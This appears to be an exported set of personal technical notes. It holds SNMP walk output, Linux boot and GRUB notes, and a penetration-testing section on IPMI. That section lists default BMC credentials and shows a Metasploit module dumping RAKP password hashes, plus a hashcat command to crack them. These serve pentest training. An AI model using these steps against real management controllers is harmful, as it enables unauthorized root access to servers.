iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (3676678) 10:12:46.78
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E5 09 14 0E 2B 2D 00 2B 02 00 
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/boot/vmlinuz-5.11.0-34-generic root=UUID=9a6a5c52-f92a-42ea-8ddf-940d7e0f4223 ro quiet splash"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 3
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 411
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
iso.3.6.1.2.1.25.1.7.0 = No more variables left in this MIB View (It is past the end of the MIB tree)

...SNIP...

iso.3.6.1.2.1.25.6.3.1.2.1232 = STRING: "printer-driver-sag-gdi_0.1-7_all"
iso.3.6.1.2.1.25.6.3.1.2.1233 = STRING: "printer-driver-splix_2.0.0+svn315-7fakesync1build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.1234 = STRING: "procps_2:3.3.16-1ubuntu2.3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.1235 = STRING: "proftpd-basic_1.3.6c-2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.1236 = STRING: "proftpd-doc_1.3.6c-2_all"
iso.3.6.1.2.1.25.6.3.1.2.1237 = STRING: "psmisc_23.3-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.1238 = STRING: "publicsuffix_20200303.0012-1_all"
iso.3.6.1.2.1.25.6.3.1.2.1239 = STRING: "pulseaudio_1:13.99.1-1ubuntu3.12_amd64"
iso.3.6.1.2.1.25.6.3.1.2.1240 = STRING: "pulseaudio-module-bluetooth_1:13.99.1-1ubuntu3.12_amd64"
iso.3.6.1.2.1.25.6.3.1.2.1241 = STRING: "pulseaudio-utils_1:13.99.1-1ubuntu3.12_amd64"
iso.3.6.1.2.1.25.6.3.1.2.1242 = STRING: "python-apt-common_2.0.0ubuntu0.20.04.6_all"
iso.3.6.1.2.1.25.6.3.1.2.1243 = STRING: "python3_3.8.2-0ubuntu2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.1244 = STRING: "python3-acme_1.1.0-1_all"
iso.3.6.1.2.1.25.6.3.1.2.1245 = STRING: "python3-apport_2.20.11-0ubuntu27.21_all"
iso.3.6.1.2.1.25.6.3.1.2.1246 = STRING: "python3-apt_2.0.0ubuntu0.20.04.6_amd64" 

...SNIP...
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="ssh"><a class="header" href="#ssh">SSH</a></h1>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="tls"><a class="header" href="#tls">TLS</a></h1>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="udp-1"><a class="header" href="#udp-1">UDP</a></h1>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="websockets"><a class="header" href="#websockets">WebSockets</a></h1>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="ipmi"><a class="header" href="#ipmi">IPMI</a></h1>
<p>Intelligent Platform Management Interface (IPMI) is a set of standardized specifications for hardware-based host management systems used for system management and monitoring. It acts as an autonomous subsystem and works independently of the host‚Äôs BIOS, CPU, firmware, and underlying operating system. IPMI provides sysadmins with the ability to manage and monitor systems even if they are powered off or in an unresponsive state. It operates using a direct network connection to the system‚Äôs hardware and does not require access to the operating system via a login shell. IPMI can also be used for remote upgrades to systems without requiring physical access to the target host.</p>
<h2 id="common-use-cases"><a class="header" href="#common-use-cases">Common Use Cases</a></h2>
<p>IPMI is typically used in three ways:</p>
<ul>
<li>Before the OS has booted to modify BIOS settings</li>
<li>When the host is fully powered down</li>
<li>Access to a host after a system failure</li>
</ul>
<p>When not being used for these tasks, IPMI can monitor a range of different things such as system temperature, voltage, fan status, and power supplies. It can also be used for querying inventory information, reviewing hardware logs, and alerting using SNMP. The host system can be powered off, but the IPMI module requires a power source and a LAN connection to work correctly.</p>
<h2 id="history-and-support"><a class="header" href="#history-and-support">History and Support</a></h2>
<p>The IPMI protocol was first published by Intel in 1998 and is now supported by over 200 system vendors, including Cisco, Dell, HP, Supermicro, Intel, and more. Systems using IPMI version 2.0 can be administered via serial over LAN, giving sysadmins the ability to view serial console output in band.</p>
<h2 id="ipmi-components"><a class="header" href="#ipmi-components">IPMI Components</a></h2>
<p>To function, IPMI requires the following components:</p>
<ul>
<li><strong>Baseboard Management Controller (BMC)</strong> - A micro-controller and essential component of an IPMI</li>
<li><strong>Intelligent Chassis Management Bus (ICMB)</strong> - An interface that permits communication from one chassis to another</li>
<li><strong>Intelligent Platform Management Bus (IPMB)</strong> - extends the BMC</li>
<li><strong>IPMI Memory</strong> - stores things such as the system event log, repository store data, and more</li>
<li><strong>Communications Interfaces</strong> - local system interfaces, serial and LAN interfaces, ICMB and PCI Management Bus</li>
</ul>
<h2 id="footprinting-the-service-2"><a class="header" href="#footprinting-the-service-2">Footprinting the Service</a></h2>
<p>IPMI communicates over port 623 UDP. Systems that use the IPMI protocol are called Baseboard Management Controllers (BMCs). BMCs are typically implemented as embedded ARM systems running Linux, and connected directly to the host‚Äôs motherboard. BMCs are built into many motherboards but can also be added to a system as a PCI card. Most servers either come with a BMC or support adding a BMC.</p>
<p>The most common BMCs we often see during internal penetration tests are HP iLO, Dell DRAC, and Supermicro IPMI. If we can access a BMC during an assessment, we would gain full access to the host motherboard and be able to monitor, reboot, power off, or even reinstall the host operating system. Gaining access to a BMC is nearly equivalent to physical access to a system.</p>
<p>Many BMCs (including HP iLO, Dell DRAC, and Supermicro IPMI) expose a web-based management console, some sort of command-line remote access protocol such as Telnet or SSH, and the port 623 UDP, which, again, is for the IPMI network protocol.</p>
<h3 id="nmap-version-detection"><a class="header" href="#nmap-version-detection">Nmap Version Detection</a></h3>
<p>Below is a sample Nmap scan using the Nmap ipmi-version NSE script to footprint the service:</p>
<pre><code class="language-bash">[!bash!]$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local

Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT
Nmap scan report for ilo.inlanfreight.local (172.16.2.2)
Host is up (0.00064s latency).

PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version:
|   Version:
|     IPMI-2.0
|   UserAuth:
|   PassAuth: auth_user, non_null_user
|_  Level: 2.0
MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise)

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
</code></pre>
<p>Here, we can see that the IPMI protocol is indeed listening on port 623, and Nmap has fingerprinted version 2.0 of the protocol.</p>
<h3 id="metasploit-version-scan"><a class="header" href="#metasploit-version-scan">Metasploit Version Scan</a></h3>
<p>We can also use the Metasploit scanner module IPMI Information Discovery (<code>auxiliary/scanner/ipmi/ipmi_version</code>):</p>
<pre><code class="language-bash">[!bash!]$ msf6 &gt; use auxiliary/scanner/ipmi/ipmi_version 
msf6 auxiliary(scanner/ipmi/ipmi_version) &gt; set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_version) &gt; show options 

Module options (auxiliary/scanner/ipmi/ipmi_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS     10.129.42.195    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
   RPORT      623              yes       The target port (UDP)
   THREADS    10               yes       The number of concurrent threads


msf6 auxiliary(scanner/ipmi/ipmi_version) &gt; run

[*] Sending IPMI requests to 10.129.42.195-&gt;10.129.42.195 (1 hosts)
[+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
</code></pre>
<h2 id="default-credentials"><a class="header" href="#default-credentials">Default Credentials</a></h2>
<p>During internal penetration tests, we often find BMCs where the administrators have not changed the default password. Some unique default passwords to keep in our cheatsheets include:</p>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Product</th><th>Username</th><th>Password</th></tr>
</thead>
<tbody>
<tr><td>Dell iDRAC</td><td>root</td><td>calvin</td></tr>
<tr><td>HP iLO</td><td>Administrator</td><td>randomized 8-character string consisting of numbers and uppercase letters</td></tr>
<tr><td>Supermicro IPMI</td><td>ADMIN</td><td>ADMIN</td></tr>
</tbody>
</table>
</div>
<p>It is also essential to try out known default passwords for ANY services that we discover, as these are often left unchanged and can lead to quick wins. When dealing with BMCs, these default passwords may gain us access to the web console or even command line access via SSH or Telnet.</p>
<h2 id="dangerous-settings-4"><a class="header" href="#dangerous-settings-4">Dangerous Settings</a></h2>
<p>If default credentials do not work to access a BMC, we can turn to a flaw in the RAKP protocol in IPMI 2.0. During the authentication process, the server sends a salted SHA1 or MD5 hash of the user‚Äôs password to the client before authentication takes place. This can be leveraged to obtain the password hash for ANY valid user account on the BMC. These password hashes can then be cracked offline using a dictionary attack using Hashcat mode 7300.</p>
<p>In the event of an HP iLO using a factory default password, we can use this Hashcat mask attack command:</p>
<pre><code class="language-bash">[!bash!]$ hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
</code></pre>
<p>This tries all combinations of upper case letters and numbers for an eight-character password.</p>
<p>There is no direct ‚Äúfix‚Äù to this issue because the flaw is a critical component of the IPMI specification. Clients can opt for very long, difficult to crack passwords or implement network segmentation rules to restrict the direct access to the BMCs. It is important to not overlook IPMI during internal penetration tests (we see it during most assessments) because not only can we often gain access to the BMC web console, which is a high-risk finding, but we have seen environments where a unique (but crackable) password is set that is later re-used across other systems. On one such penetration test, we obtained an IPMI hash, cracked it offline using Hashcat, and were able to SSH into many critical servers in the environment as the root user and gain access to web management consoles for various network monitoring tools.</p>
<h3 id="metasploit-hash-dumping"><a class="header" href="#metasploit-hash-dumping">Metasploit Hash Dumping</a></h3>
<p>To retrieve IPMI hashes, we can use the Metasploit IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval module:</p>
<pre><code class="language-bash">[!bash!]$ msf6 &gt; use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; show options 

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                 Current Setting                                                    Required  Description
   ----                 ---------------                                                    --------  -----------
   CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format
   PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
   RPORT                623                                                                yes       The target port
   THREADS              1                                                                  yes       The number of concurrent threads (max one per host)
   USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line



msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; run

[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
</code></pre>
<p>Experimenting with different word lists is crucial for obtaining the password from the acquired hash. Here we can see that we have successfully obtained the password hash for the user ADMIN, and the tool was able to quickly crack it to reveal what appears to be a default password ADMIN. From here, we could attempt to log in to the BMC, or, if the password were something more unique, check for password re-use on other systems.</p>
<h2 id="security-considerations-2"><a class="header" href="#security-considerations-2">Security Considerations</a></h2>
<p>IPMI is very common in network environments since sysadmins need to be able to access servers remotely in the event of an outage or perform certain maintenance tasks that they would traditionally have had to be physically in front of the server to complete. This ease of administration comes with the risk of exposing password hashes to anyone on the network and can lead to unauthorized access, system disruption, and even remote code execution. Checking for IPMI should be part of our internal penetration test playbook for any environment we find ourselves assessing.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="redis-1"><a class="header" href="#redis-1">Redis</a></h1>
<h2 id="directory-map-24"><a class="header" href="#directory-map-24">Directory Map</a></h2>
<ul>
<li><a href="#redis-2">redis</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="redis-2"><a class="header" href="#redis-2">redis</a></h1>
<p><img src="redis/redis_arch.png" title="Redis" alt="redis_architecture"></p>
<h2 id="slowlog"><a class="header" href="#slowlog">Slowlog</a></h2>
<p>https://redis.io/commands/slowlog-get/</p>
<p>‚Ä¶
The SLOWLOG GET command returns entries from the slow log in chronological order</p>
<p>The Redis Slow Log is a system to log queries that exceeded a specified execution time. The execution time does not include I/O operations like talking with the client, sending the reply and so forth, but just the time needed to actually execute the command (this is the only stage of command execution where the thread is blocked and can not serve other requests in the meantime).</p>
<p>A new entry is added to the slow log whenever a command exceeds the execution time threshold defined by the slowlog-log-slower-than configuration directive. The maximum number of entries in the slow log is governed by the slowlog-max-len configuration directive.</p>
<p>By default the command returns latest ten entries in the log. The optional count argument limits the number of returned entries, so the command returns at most up to count entries, the special number -1 means return all entries.</p>
<p>Each entry from the slow log is comprised of the following six values:</p>
<ol>
<li>A unique progressive identifier for every slow log entry.</li>
<li>The unix timestamp at which the logged command was processed.</li>
<li>The amount of time needed for its execution, in microseconds.</li>
<li>The array composing the arguments of the command.</li>
<li>Client IP address and port.</li>
<li>Client name if set via the CLIENT SETNAME command.</li>
</ol>
<p>The entry‚Äôs unique ID can be used in order to avoid processing slow log entries multiple times (for instance you may have a script sending you an email alert for every new slow log entry). The ID is never reset in the course of the Redis server execution, only a server restart will reset it.</p>
<pre><code>SLOWLOG GET [count]
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="systems"><a class="header" href="#systems">Systems</a></h1>
<p>Notes on Linux systems administration, kernel internals, and system-level concepts.</p>
<h2 id="core-topics"><a class="header" href="#core-topics">Core Topics</a></h2>
<h3 id="system-fundamentals"><a class="header" href="#system-fundamentals">System Fundamentals</a></h3>
<ul>
<li><a href="#linux-kernel-boot-process">Linux Kernel Boot Process</a></li>
<li><a href="#common-files-and-directories">Common Files and Directories</a></li>
<li><a href="#devices">Devices</a></li>
<li><a href="#disks">Disks</a></li>
<li><a href="#file-systems">File Systems</a></li>
<li><a href="#groups-1">Groups</a></li>
<li><a href="#hashing-1">Hashing</a></li>
<li><a href="#hard-and-soft-links">Hard and Soft Links</a></li>
<li><a href="#lvm-logical-volume-manager">LVM (Logical Volume Manager)</a></li>
<li><a href="#memory">Memory</a></li>
<li><a href="#memory-management">Memory Management</a></li>
<li><a href="#networking-1">Networking</a></li>
<li><a href="#network-manager">Network Manager</a></li>
<li><a href="#permissions">Permissions</a></li>
<li><a href="#processes">Processes</a></li>
<li><a href="#troubleshooting-storage">Storage</a></li>
<li><a href="#time">Time</a></li>
<li><a href="#users-and-user-management">Users and User Management</a></li>
</ul>
<h3 id="system-services-and-configuration"><a class="header" href="#system-services-and-configuration">System Services and Configuration</a></h3>
<ul>
<li><a href="#systemd">Systemd</a></li>
<li><a href="#pluggable-authentication-modules-pam">PAM (Pluggable Authentication Modules)</a></li>
<li><a href="#logging">Logging</a></li>
<li><a href="#scheduled-tasks">Scheduled Tasks</a></li>
<li><a href="#bash-startup-files">Bash Startup Files</a></li>
</ul>
<h3 id="development-and-tools"><a class="header" href="#development-and-tools">Development and Tools</a></h3>
<ul>
<li><a href="#dev-tools">Development Tools</a></li>
<li><a href="#make">Make</a></li>
<li><a href="#commands-2">Linux Commands</a></li>
</ul>
<h3 id="system-internals"><a class="header" href="#system-internals">System Internals</a></h3>
<ul>
<li><a href="#kernel-subsystems">Kernel</a></li>
<li><a href="#interrupts-and-traps">Interrupts</a></li>
<li><a href="#system-calls">System Calls</a></li>
<li><a href="#key-value-store">Key-Value Stores</a></li>
</ul>
<h3 id="observability-and-troubleshooting"><a class="header" href="#observability-and-troubleshooting">Observability and Troubleshooting</a></h3>
<ul>
<li><a href="#linux-observability-sources">Observability Sources</a></li>
<li><a href="#per-process-analysis">Per-Process Analysis</a></li>
<li><a href="#system-wide-analysis">System-Wide Analysis</a></li>
<li><a href="#troubleshooting-1">Troubleshooting</a></li>
</ul>
<h2 id="subdirectories"><a class="header" href="#subdirectories">Subdirectories</a></h2>
<h3 id="bash"><a class="header" href="#bash"><a href="systems/bash">Bash</a></a></h3>
<p>Shell scripting and bash-specific notes</p>
<ul>
<li><a href="#bash-notes">Bash Notes</a></li>
<li><a href="#moving-the-cursor-1">Keyboard Shortcuts</a></li>
</ul>
<h3 id="commands-1"><a class="header" href="#commands-1"><a href="systems/commands">Commands</a></a></h3>
<p>Detailed documentation for specific Linux commands</p>
<ul>
<li><a href="#chgrp">chgrp</a></li>
<li><a href="#chmod">chmod</a></li>
<li><a href="#chown">chown</a></li>
<li><a href="#dd">dd</a></li>
<li><a href="#groups-2">groups</a></li>
<li><a href="#ip">ip</a></li>
<li><a href="#job-control">Job Control</a></li>
<li><a href="#kill">kill</a></li>
<li><a href="#lsscsi">lsscsi</a></li>
<li><a href="#passwd">passwd</a></li>
<li><a href="#ps">ps</a></li>
<li><a href="#umask">umask</a></li>
</ul>
<h3 id="greybeard-qualification"><a class="header" href="#greybeard-qualification"><a href="systems/greybeard-qualification">Greybeard Qualification</a></a></h3>
<p>Advanced Linux system administration topics</p>
<ul>
<li><a href="#block-devices-and-file-systems">Block Devices and File Systems</a></li>
<li><a href="#memory-management-1">Memory Management</a></li>
<li><a href="#execution-and-scheduling-of-processes-and-threads">Process Execution and Scheduling</a></li>
<li><a href="#process-structure-and-ipc">Process Structure and IPC</a></li>
<li><a href="#startup-and-init">Startup and Init</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="linux-kernel-boot-process"><a class="header" href="#linux-kernel-boot-process">Linux Kernel Boot Process</a></h1>
<p>High Level Process:</p>
<ol>
<li>The machine‚Äôs BIOS or EUFI loads and runs a boot loader</li>
<li>The boot loader finds the kernel image on disk, loads it into memory, and starts it.</li>
<li>The kernel takes over and initializes the devices and drivers for each. This happens in the following order:
<ol>
<li>CPU inspection</li>
<li>memory inspection</li>
<li>device bus discovery</li>
<li>device discovery</li>
<li>Auxiliary kernel subsystem setup (networking, etc.)</li>
</ol>
</li>
<li>The kernel mounts the root filesystem</li>
<li>The kernel starts a program called init (systemd) with a PID of 1. This point is the user-space startup.</li>
<li>init sets the rest of the system processes in motion</li>
<li>At some point, init starts a process allowing you to login, usually at the end or near the end of the boot sequence.</li>
</ol>
<p>The best way to view the boot process diagnostic logs is with <code>journalctl</code>. You can use <code>journalctl -k</code> to view messages from the current boot. You can use the <code>-b</code> option to view messages from previous boots. You can also check for a log file such as <code>/var/log/kern.log</code> or run the <code>dmesg</code> command to view the messages in the kernel ring buffer.</p>
<h2 id="kernel-parameters"><a class="header" href="#kernel-parameters">Kernel parameters</a></h2>
<p>When the linux kernel starts, it receives a list of text parameters containg a few additional system details. The parameters specify many different types of behavior, such as the amount of diagnostic output the kernel should produce and device driver-specific options.</p>
<ul>
<li>You can view the parameters passed to the kernel by looking at the <code>/proc/cmdline</code> file:
<pre><code>root@nginx-vm-00:~# cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-5.15.0-1029-azure root=PARTUUID=c51187ab-04cc-499f-8947-0211dc8d74e7 ro console=tty1 console=ttyS0 earlyprintk=ttyS0 panic=-1
</code></pre>
Upon encountering a parameter that the kernel does not understand, the kernel passes that parameter to the init system. For example, if you were to pass the <code>-s</code> parameter to the kernel, the kernel would pass that parameter to systemd to boot the system into single-user mode. Read the <code>bootparam(7)</code> man page for more info on kernel boot parameters.</li>
</ul>
<h2 id="boot-loaders"><a class="header" href="#boot-loaders">Boot Loaders</a></h2>
<ul>
<li>At the start of the boot process, a boot loader starts the kernel. It loads the kernel into memory from somewhere on disk, and then starts the kernel with a set of kernel parameters as described above. This process sounds simple, right? Well, it gets a bit more complicated. Some questions need to be answered: ‚Äúwhere is the kernel?‚Äù and ‚Äúwhat boot parameters do we use?‚Äù. It seems like these answers should be easy to find. But remember, the kernel is not yet running, and it‚Äôs the kernel‚Äôs job to traverse a file system to locate files. We have a ‚Äòchicken and egg‚Äô problem.</li>
<li>A boot loader does need a driver to access a disk. On PCs, the boot loader uses the BIOS of UEFI to access disks. Disk hardware typically includes firmware that allows the BIOS or UEFI to acecss attached storage hardware via Logical Block Addressing (LBA). LBA is a universal, simple way to access data from any disk.</li>
<li>To determine if your system uses BIOS or UEFI, you can run <code>efibootmgr</code>. If you get a list of boot devices, your system is using UEFI. If you get an error stating UEFI parameters are not supported, your system is using BIOS. Alternatively, if <code>/sys/firmware/efi</code> exists, your system is using UEFI.</li>
<li>Boot loaders typically allow users to switch between different kernels and operating systems.</li>
<li>Common Boot Loaders
<ul>
<li>GRUB = Used on most linux systems. Supports BIOS and UEFI</li>
<li>LILO = One of the first boot loaders available for linux.</li>
<li>SYSLINUX</li>
<li>systemd-boot</li>
<li>coreboot</li>
</ul>
</li>
<li>Accessing the boot loader may be different on each system. Linux distrobutions tend to heavily modify the boot loader, causing some confusion. On a PC, you can typically hold down <code>shift</code> or <code>esc</code> to access the boot loader shortly after powering on the system.</li>
<li>To generate a grub configuration file:
<ul>
<li>grub2-mkconfig -o /boot/grub2/grub.cfg for BIOS systems</li>
<li>grub2-mkconfig -o /boot/efi/EFI/grub.cfg for EFI systems</li>
<li>grub2-install can be used to install grub on a disk</li>
<li>The boot loader is typically stored on the first few sectors of a disk</li>
<li>The grub2.cfg file is typically stored at /boot/grub2/grub.cfg for BIOS systems</li>
</ul>
</li>
<li>/etc/default/grub is used by the grub2-mkconfig utility to determine what settings to use when it generates the grub2.cfg file. After you modify this file, you need to run <code>grub2-mkconfig</code> to actually regenerate the grub2 config
<pre><code class="language-shell">GRUB_TIMEOUT=1
GRUB_TIMEOUT_STYLE=countdown
GRUB_DISTRIBUTOR="$(sed 's, release .*$,,g' /etc/system-release)"
GRUB_DEFAULT=saved
GRUB_DISABLE_SUBMENU=true
GRUB_TERMINAL="serial console"
GRUB_CMDLINE_LINUX="console=tty1 console=ttyS0,115200n8 earlyprintk=ttyS0,115200 rootdelay=300 scsi_mod.use_blk_mq=y crashkernel=auto"
GRUB_DISABLE_RECOVERY="true"
GRUB_ENABLE_BLSCFG=true
GRUB_SERIAL_COMMAND="serial --speed=115200 --unit=0 --word=8 --parity=no --stop=1"
</code></pre>
</li>
<li>Install, Configure, and Troubleshoot BootLoaders
<ul>
<li>To regenerate grub2 config:
<ul>
<li>Boot into recovery media, then:
<ul>
<li><code>chroot /mnt/sysroot</code></li>
<li>To regenerate grub config for BIOS system
<ul>
<li><code>grub2-mkconfig -o /boot/grub2/grub.cfg</code></li>
</ul>
</li>
<li>To regenerate grub config for EFI system:
<ul>
<li><code>grub2-mkconfig -o /boot/efi/EFI/centos/grub.cfg</code></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>To reinstall the boot loader:
<ul>
<li>BIOS systems:
<ul>
<li>Use <code>lsblk</code> to look at block devices. Try to identify the boot device</li>
<li>Use <code>grub2-install /dev/sda</code> to install grub to the boot device</li>
</ul>
</li>
<li>EFI Systems:</li>
<li>Use <code>dnf reinstall grub2-efi grub2-efi-modules shim</code> to reinstall grub to the boot device</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="grub"><a class="header" href="#grub">Grub</a></h3>
<ul>
<li>The grub configuration directory is usually <code>/boot/grub</code> or <code>/boot/grub2</code> (grub2 on redhat distros)</li>
<li>The main configuration file for grub is <code>grub.cfg</code>. Do not modify this file directly, instead use <code>grub-mkconfig</code>. The files in <code>/etc/grub.d</code> are shell scripts that make up the <code>grub.cfg</code>. When you call <code>grub-mkconfig</code>, it references these scripts in <code>/etc/grub.d</code> to create the <code>grub.cfg</code>. To modify the grub configuration, simply add another script to this directory. Then call <code>grub-mkconfig</code>, overwriting the <code>/boot/grub/grub.cfg</code> file: <code>grub-mkconfig -o /boot/grub/grub.cfg</code></li>
<li>To (re)install grub, you can use <code>grub-install</code>
<ul>
<li>Example for installing grub on a mounted storage device: <code>grub-install --boot-directory=/mnt/boot /dev/sdc</code></li>
</ul>
</li>
</ul>
<h3 id="user-space-init"><a class="header" href="#user-space-init">User space init</a></h3>
<p>Process overview:</p>
<ol>
<li>init system starts (typically systemd)
<ul>
<li>See <a href="#systemd">systemd</a></li>
</ul>
</li>
<li>Essential low-level services start (think udevd and syslogd)</li>
<li>Network services start</li>
<li>Mid and high-level services start (cron, printing, etc.)</li>
<li>Login prompts, GUIs, and high-level apps, such as web servers start</li>
</ol>
<h3 id="shutting-down-the-system"><a class="header" href="#shutting-down-the-system">Shutting down the system</a></h3>
<ul>
<li>You can use <code>sudo systemctl reboot --force</code> to force a system to reboot</li>
<li>only the superuser can reboot</li>
<li><code>shutdown</code> takes a time parameter for scheduling a shutdown.
<ul>
<li>ex: <code>shutdown 03:00</code> = shutdown at 3AM</li>
<li><code>shutdown +15</code> shutdown in 15 minutes</li>
<li>If you specify a time in the future, the shutdown command creates a file called <code>/etc/nologin</code> and no one but the superuser is able to login to the system.</li>
<li>When the shutdown time arrives, shutdown tells the init system to begin the shutdown process. On a system using systemd, this means activating the shutdown units.</li>
</ul>
</li>
<li>If you halt the system, it shuts the machine down immediately. To do this, run: <code>shutdown -h now</code> or <code>halt</code>
<ul>
<li>On most versions of Linux, a halt cuts power to the system. This can be unforgiving, as it does not give disk buffers time to sync (potentially causing corrupt data).</li>
</ul>
</li>
<li>The shutdown process:
<ol>
<li>init asks every process to shut down cleanly</li>
<li>If a process doesn‚Äôt respond after a while, init kills it, first trying a TERM signal</li>
<li>If the TERM signal doesn‚Äôt work, init uses the KILL signal</li>
<li>The system locks system files to prevent modification</li>
<li>The system unmounts all filesystems other than root</li>
<li>The system remounts root as read-only</li>
<li>The final step is to call the kernel to reboot or stop with the <code>reboot(2)</code> system call</li>
</ol>
</li>
</ul>
<h3 id="initram-fs"><a class="header" href="#initram-fs">InitRam FS</a></h3>
<ul>
<li>We need the initramfs because the kernel does not talk directly to the PC BIOS or EFI to get data from disks. So in order to mount its root filesystem, it needs driver support for the underlying storage. There are so many storage controllers that having a driver for each one in the kernel is not feasible. Therefore, these drivers are shipped as loadable modules. These modules exist on disk, so we have a chicken and egg scenario. How can the kernel load these drivers from disk if it cannot read the disk because it doesn‚Äôt currently have these drivers loaded?</li>
<li>The workaround is to gather these drives along with a few other utilities into a <code>cpio</code> archive. The boot loader loads this archive into memory before running the kernel. Upon start, the kernel reads the contents of the archive into a temp file system in RAM known as the initramfs, mounts it at <code>/</code>, and performs the user-mode handoff to the init on the initramfs. Then, the utilities included in the initramfs allow the kernel to load the necessary driver modules for the real root filesystem. Finally, the utilities mount the real root filesystem and start the init system.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="common-files-and-directories"><a class="header" href="#common-files-and-directories">Common Files and Directories</a></h1>
<p>Most system configuration files on a Linux system are found in <code>/etc</code></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="dev-tools"><a class="header" href="#dev-tools">Dev Tools</a></h1>
<h2 id="gcc-c-compiler"><a class="header" href="#gcc-c-compiler">GCC (c compiler)</a></h2>
<p>
The c compiler on most Unix systems is the GNU C Compiler (gcc).
</p>

<p>Here is a classic program written in c:</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;

int main(){
  printf("Hello, World!\n");
}
</code></pre>
<p>You can compile it by saving it in a file ending with a <code>.c</code> extension, and then running:</p>
<pre><code class="language-sh">cc -o hello hello.c
</code></pre>
<h2 id="shared-libraries"><a class="header" href="#shared-libraries">Shared Libraries</a></h2>
<p>Shared libraries have a <code>.so</code> extension (shared object)</p>
<p>You can see what shared libraries a program uses by running <code>ldd</code>:</p>
<pre><code class="language-sh">ryan:notes/  |main ?:1 ‚úó|$ ldd /bin/bash
        linux-vdso.so.1 (0x00007fff758ab000)
        libtinfo.so.6 =&gt; /lib/x86_64-linux-gnu/libtinfo.so.6 (0x00007fae9d281000)
        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fae9d059000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fae9d429000)
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="devices"><a class="header" href="#devices">devices</a></h1>
<ul>
<li>The udev service enables user space programs to automatically configure and use new devices.</li>
<li>The kernel presents many IO interfaces for devices as files to user space processes</li>
<li>device files are in the <code>/dev</code> directory</li>
<li>to identify a device and view it‚Äôs properties, use <code>ls -l</code>. Note the first character of each line in the output below. If you see b (block), c (character), p (pipe), or s (socket), the file is a device.
<ul>
<li>
